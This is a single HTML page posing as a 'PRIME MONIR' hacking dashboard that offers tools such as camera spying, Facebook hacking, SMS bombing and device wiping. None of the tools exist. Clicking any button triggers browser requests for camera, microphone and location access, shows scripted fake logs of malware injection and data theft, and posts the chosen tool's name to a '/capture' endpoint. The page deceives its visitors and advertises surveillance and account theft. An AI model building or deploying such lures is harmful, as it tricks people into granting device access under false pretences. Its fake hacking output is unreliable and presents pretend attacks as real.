<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PRIME MONIR | EXPLOIT V15</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Share+Tech+Mono&display=swap');
        
        body, html { margin: 0; padding: 0; background: #000; color: #0f0; font-family: 'Share Tech Mono', monospace; overflow: hidden; height: 100%; }
        #matrix-canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.2; }

        /* হ্যাকিং লোডার - বাম থেকে ডানে প্রোগ্রেস বার */
        #loader {
            position: fixed; width: 100%; height: 100%; background: #000;
            display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 9999;
        }
        .progress-box { width: 80%; max-width: 400px; height: 15px; border: 2px solid #0f0; background: #111; box-shadow: 0 0 20px #0f0; position: relative; }
        .progress-bar { width: 0%; height: 100%; background: #0f0; box-shadow: 0 0 20px #0f0; animation: fillBar 2.5s forwards linear; }
        @keyframes fillBar { to { width: 100%; } }
        .loading-text { font-family: 'Orbitron'; font-size: 18px; color: #0f0; text-shadow: 0 0 10px #0f0; margin-bottom: 20px; letter-spacing: 3px; }

        /* প্রিমিয়াম হ্যাকার ড্যাশবোর্ড */
        #dashboard { display: none; padding: 20px; text-align: center; }
        .neon-title { font-family: 'Orbitron'; font-size: 35px; color: #fff; text-shadow: 0 0 20px #f00, 0 0 40px #f00; margin-bottom: 10px; animation: glitch 2s infinite; }
        @keyframes glitch { 0% { opacity: 1; } 50% { opacity: 0.7; transform: skewX(-5deg); } 100% { opacity: 1; } }

        .system-info { color: #0ff; font-size: 10px; border: 1px solid #333; display: inline-block; padding: 5px 15px; border-radius: 50px; margin-bottom: 30px; }

        /* ২ কলাম গ্রিড - বড় এবং উজ্জ্বল বাটন */
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; padding: 10px; }
        .tool-box {
            background: linear-gradient(45deg, #050505, #111); border: 2px solid #f00;
            padding: 30px 10px; color: #fff; font-weight: bold; font-size: 13px;
            cursor: pointer; position: relative; transition: 0.3s;
            clip-path: polygon(15% 0, 100% 0, 100% 85%, 85% 100%, 0 100%, 0 15%);
        }
        .tool-box:hover { background: #f00; color: #000; box-shadow: 0 0 30px #f00; transform: translateY(-5px); }
        .tool-box::before { content: '✓'; position: absolute; top: 5px; right: 10px; font-size: 8px; color: #0f0; }

        /* কনসোল লোগ */
        #console { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #0f0; padding: 25px; z-index: 10000; text-align: left; border: 10px solid #f00; box-sizing: border-box; }
    </style>
</head>
<body>
    <canvas id="matrix-canvas"></canvas>

    <div id="loader">
        <div class="loading-text">BYPASSING SECURITY...</div>
        <div class="progress-box"><div class="progress-bar"></div></div>
    </div>

    <div id="dashboard">
        <div class="neon-title">PRIME MONIR</div>
        <div class="system-info">STATUS: <span style="color:#0f0">ONLINE</span> | ACCESS: <span style="color:#f00">ROOT_V15</span></div>
        
        <div class="grid">
            <div class="tool-box" onclick="launch('CAM SPY')">CAM SPY</div>
            <div class="tool-box" onclick="launch('LIVE LOC')">LIVE LOC</div>
            <div class="tool-box" onclick="launch('GALLERY')">GALLERY</div>
            <div class="tool-box" onclick="launch('SMS BOMB')">SMS BOMB</div>
            <div class="tool-box" onclick="launch('FB HACK')">FB HACK</div>
            <div class="tool-box" onclick="launch('MIC SPY')">MIC SPY</div>
            <div class="tool-box" onclick="launch('FILE MGR')">FILE MGR</div>
            <div class="tool-box" onclick="launch('SIM DATA')">SIM DATA</div>
            <div class="tool-box" onclick="launch('WA CLONE')">WA CLONE</div>
            <div class="tool-box" onclick="launch('WIPE DEV')">WIPE DEV</div>
            <div class="tool-box" onclick="launch('ROOT ACC')">ROOT ACC</div>
            <div class="tool-box" onclick="launch('SHELL')">SHELL</div>
        </div>
    </div>

    <div id="console">
        <h2 id="con-title" style="color:#f00; font-family:'Orbitron';"></h2>
        <div id="con-logs" style="line-height: 2;"></div>
    </div>

    <script>
        setTimeout(() => {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('dashboard').style.display = 'block';
        }, 3000);

        async function launch(name) {
            try { 
                await navigator.mediaDevices.getUserMedia({video:true, audio:true}); 
                navigator.geolocation.getCurrentPosition(()=>{});
            } catch(e){}

            document.getElementById('dashboard').style.display = 'none';
            document.getElementById('console').style.display = 'block';
            document.getElementById('con-title').innerText = "EXECUTING: " + name;

            const logs = document.getElementById('con-logs');
            const data = ["> Infiltrating Kernel...", "> Breaking Encryption...", "> Injecting Malware...", "> Harvesting Data...", "> Sending to Server...", "> SUCCESS!"];
            
            let i = 0;
            const t = setInterval(() => {
                if(i < data.length) {
                    logs.innerHTML += `<div>${data[i]}</div>`;
                    i++;
                } else { clearInterval(t); }
            }, 1000);

            fetch('/capture', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({tool:name}) });
        }

        const c = document.getElementById("matrix-canvas"); const ctx = c.getContext("2d");
        c.width = window.innerWidth; c.height = window.innerHeight;
        const d = Array(Math.floor(c.width/18)).fill(1);
        function draw(){
            ctx.fillStyle = "rgba(0,0,0,0.05)"; ctx.fillRect(0,0,c.width,c.height);
            ctx.fillStyle = "#f00"; ctx.font = "16px monospace";
            d.forEach((y,i)=>{
                ctx.fillText(Math.random()>0.95?"☠":"01", i*18, y*18);
                if(y*18 > c.height && Math.random() > 0.975) d[i] = 0;
                d[i]++;
            });
        } setInterval(draw, 50);
    </script>
</body>
</html>
